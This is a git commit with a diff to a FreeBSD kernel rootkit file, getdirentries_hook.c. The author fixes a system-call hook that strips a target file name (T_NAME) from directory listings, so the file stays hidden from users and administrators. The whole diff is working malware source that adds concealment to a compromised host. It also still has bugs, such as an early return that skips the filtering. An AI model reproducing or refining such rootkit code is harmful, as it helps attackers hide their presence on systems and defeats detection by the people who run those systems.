36093765e512d6026c6113d27ce8af042ec3184f
Hooplahaha <josephschirato@gmail.com>
2018-10-09 10:39:42 +1100

    I fixed a few mistakes I had made when I first started this getdirentry hook. Going to start testing it

--- rootkit/getdirentries_hook.c
+++ rootkit/getdirentries_hook.c
@@ -51,16 +51,23 @@ __FBSDID("$FreeBSD$");
 
 #include "rootkit.h"
 
-int
+static int
 sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 {
-	
+	long base;
 	int error;
-
-	error = sys_getdirentries(td,uap);
 
 	struct dirent *dp, *current;
 	unsigned int size, count;
+
+	error = kern_getdirentries(td,uap->fd, uap->buf, uap->count, &base, NULL, UIO_USERSPACE);
+
+	if (error!=0) return error;
+	if (uap->basep != NULL){
+		error = copyout(&base, uap->basep, sizeof(long));
+		return error;
+	}
+	
 
 	size = td->td_retval[0];
 
@@ -69,7 +76,7 @@ sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 		copyin(uap->buf,dp,size);
 		current = dp;
 		count = size;
-		while((current->d_reclen != 0) && count > 0){
+		while((current->d_reclen != 0) && (count > 0)){
 			count -= current->d_reclen;
 			if(strcmp((char*)&(current->d_name),T_NAME) == 0){
 				if (count != 0){
@@ -78,11 +85,15 @@ sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 			size-=current->d_reclen;
 			break;
 			}
+
+			if (count != 0){
+				current = (struct dirent *)((char*)current + current->d_reclen);
+			}
+		}
 		td->td_retval[0] = size;
 		copyout(dp,uap->buf,size);
 
 		FREE(dp,M_TEMP);
-		}
 	}
 
 	return (error);
